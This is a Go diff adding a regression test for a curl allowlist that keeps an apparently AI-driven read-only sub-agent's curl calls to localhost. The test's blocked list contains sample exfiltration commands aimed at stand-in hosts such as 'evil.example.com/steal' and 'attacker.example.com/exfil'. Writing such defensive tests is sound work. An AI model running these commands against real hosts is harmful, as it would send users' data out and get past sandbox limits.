@@ -88,3 +88,35 @@ func contains(s, sub string) bool {
 		return false
 	})()
 }
+
+// TestIsAllowedReadOnlyCurl_LocalhostOnly is the regression for the first
+// attempt at this fix, which allowed curl by a blanket prefix match and
+// broke TestRunCommandReadOnly_RejectsNonAllowlisted (internal/agent's
+// suite) — "curl http://x" reaching an arbitrary external host from a
+// read-only sub-agent is a real exfiltration/SSRF surface, not just an
+// allowlist nicety. Only localhost/127.0.0.1/::1/0.0.0.0 targets pass.
+func TestIsAllowedReadOnlyCurl_LocalhostOnly(t *testing.T) {
+	allowed := []string{
+		`curl -s http://127.0.0.1:8199/`,
+		`curl -s http://localhost:8199/hakkimda`,
+		`curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8199/iletisim`,
+		`curl --help`, // no URL at all — nothing to exfiltrate to
+	}
+	for _, c := range allowed {
+		if !isAllowedReadOnlyCurl(c) {
+			t.Errorf("isAllowedReadOnlyCurl(%q) = false, want true", c)
+		}
+	}
+
+	blocked := []string{
+		`curl http://x`,
+		`curl -s https://evil.example.com/steal`,
+		`curl -s http://127.0.0.1:8199/ https://attacker.example.com/exfil`,
+		`curl -s http://internal-service.company.local/`,
+	}
+	for _, c := range blocked {
+		if isAllowedReadOnlyCurl(c) {
+			t.Errorf("isAllowedReadOnlyCurl(%q) = true, want false", c)
+		}
+	}
+}
